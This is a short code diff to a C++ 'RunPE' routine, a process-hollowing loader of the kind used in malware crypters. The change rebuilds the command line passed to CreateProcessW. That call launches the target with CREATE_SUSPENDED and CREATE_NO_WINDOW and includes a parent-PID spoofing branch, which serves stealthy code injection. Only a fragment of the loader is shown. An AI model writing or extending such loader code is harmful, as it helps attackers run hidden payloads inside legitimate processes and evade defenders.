@@ -65,6 +65,13 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	ULONG RetSize;
 	//DWORD pid;
 	PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)lpFile;
+	
+	std::wstring wstrCmdLine(GetCommandLineW());
+	wstrCmdLine.erase(0, wstrCmdLine.find(L" ")); 
+	printfdbg("CmdLine %ls\n",wstrCmdLine.c_str()); 
+	std::wstring concatted_stdstr = std::wstring(path) + L" " + wstrCmdLine;
+	LPWSTR concatted = (LPWSTR)concatted_stdstr.c_str();
+	
 #ifndef WIN64
 	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD)lpFile + IDH->e_lfanew);
 #else
@@ -112,14 +119,14 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	 
 	SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 	 
-	if (pCreateProcessW(path, args, NULL, NULL, NULL,  
+	if (pCreateProcessW(NULL, concatted, NULL, NULL, NULL,  
 	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI.StartupInfo, &PI))
 
 #else //PPID 
 	STARTUPINFOW SI;  
 	memset(&SI, 0, sizeof(STARTUPINFOW));
 
-	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
+	if (pCreateProcessW(NULL, concatted, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
 
 #endif //PPID
 	{
